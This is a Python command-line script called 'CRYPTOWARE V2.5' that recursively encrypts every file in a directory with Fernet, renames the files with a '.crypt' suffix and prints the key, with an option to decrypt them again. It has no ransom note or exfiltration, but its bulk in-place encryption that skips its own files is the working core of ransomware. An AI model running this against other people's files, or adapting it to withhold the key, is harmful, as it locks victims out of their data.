#!/usr/bin/env python3
# CRYPTOWARE V2.5
# this version will encrypt all files and subfolders using symmetric encryption
# this is a command line function made for the terminal
# written by metr0 and openAI 
# 1-13-2023
import os
import time
from cryptography.fernet import Fernet, InvalidToken, InvalidSignature
import argparse

# color text class
class ansi:
    RED = '\033[1;31m' 
    GREEN = '\033[1;32m' 
    BOLD = '\033[1m'
    CYAN = '\033[1;36m'
    END = '\033[0m'

##################################ENCRYPT FUNCTION###########################
# directory function
def encrypt_subfolders(key, directory):
    filecount = 0
    for dirpath, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith('.crypt') or filename == os.path.basename(__file__):
                continue
            if filename.endswith('.py') or filename == 'cryptoware2' or filename == 'decrypt2':
                continue
            file_path = os.path.join(dirpath, filename)
            encrypt_file(key, file_path)
            os.rename(file_path, file_path + '.crypt')
            print(f'[  {ansi.GREEN}OK{ansi.END}  ]{file_path} has been encrypted')	
            filecount += 1
    return filecount
    
# encryption function
def encrypt_file(key, file_path):
    try:
        with open(file_path, 'rb') as f:
            contents = f.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file_path, 'wb') as f:
            f.write(encrypted_contents)
    except (IOError, OSError):
        print(f'[  {ansi.RED}ERROR{ansi.END}  ] Unable to encrypt {file_path}')

############################DECRYPT FUNCTION#################################

def decrypt_subfolders(key, directory):
    filecount = 0
    for dirpath, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            if not filename.endswith('.crypt'):
                continue
            file_path = os.path.join(dirpath, filename)
            decrypt_file(key, file_path)
            os.rename(file_path, file_path[:-6])
            print(f'[  {ansi.GREEN}OK{ansi.END}  ]{file_path} has been decrypted')
            filecount += 1
    return filecount 

def decrypt_file(key, file_path):
    try:
        with open(file_path, 'rb') as f:
            contents = f.read()
        decrypted_contents = Fernet(key).decrypt(contents)
        with open(file_path, 'wb') as f:
            f.write(decrypted_contents)
    except (IOError, OSError):
        print(f'[  {ansi.RED}ERROR{ansi.END}  ] Unable to decrypt {file_path}')


def main():

    parser = argparse.ArgumentParser('./cryptoware2.py [yourdirectory]')
    parser.add_argument('path', help='path to directory')
    parser.add_argument('-e', '--encrypt', action='store_true', help='encrypts the folder')
    parser.add_argument('-d', '--decrypt', action='store_true', help='decrypts the folder')
    parser.add_argument('-k', '--key', nargs='?', help='key text')
    parser.add_argument('-K', '--keyfile', nargs='?', help='key file')
    args = parser.parse_args()
    directory = args.path

    if args.encrypt:
        key = Fernet.generate_key()
        
        print('\n[  START  ] Encryption')
        encrypted_files = encrypt_subfolders(key, directory)
        print('[  FINISH  ] Encryption')
        print(f'\n{ansi.RED}[ {encrypted_files} has been encrypted ]{ansi.END}\n')
        print('-' * 66)
        print(f'[*] this is your key: {ansi.CYAN}{str(key)[2:-1]}{ansi.END}')
        print('-' * 66)

    #TODO fix this logic
    elif args.decrypt and not args.key:

        if args.decrypt and args.keyfile:
            try:
                keyfile = args.keyfile
                with open(keyfile, 'rb') as f:
                    key = f.read()
                print('[  START  ] Decryption')
                decrypted_files = decrypt_subfolders(key, directory)
                print('[  FINISH  ] Decryption')
                print(f'\n{ansi.RED}[ {decrypted_files} has been decrypted ]{ansi.END}\n')

            except (InvalidToken, InvalidSignature):
                print('\n[!] this is the wrong key')

            except FileNotFoundError:
                print('\n[!] file not found')
 
        else: 
            print('you forgot to enter the key')
            print('./cryptoware2.py [yourdirectory] -d -k [yourkey]')
            print('./cryptoware2.py [yourdirectory] -d -K [yourkeyfile]') 

    elif args.decrypt and args.key:
        try:
            key = bytes(args.key, 'utf-8')
            print('[  START  ] Decryption')
            decrypted_files = decrypt_subfolders(key, directory)
            print('[  FINISH  ] Decryption')
            print(f'\n{ansi.RED}[ {decrypted_files} has been decrypted ]{ansi.END}\n')

        except (InvalidToken, InvalidSignature):
            print('\n[!] this is the wrong key')

    else:
        print('error no arguments')
        print('usage: ./cryptoware2.py [yourdirectory] --encrypt --decrypt --key [yourkey] --keyfile [yourkeyfile]')

if __name__ == "__main__":
    main()
    

    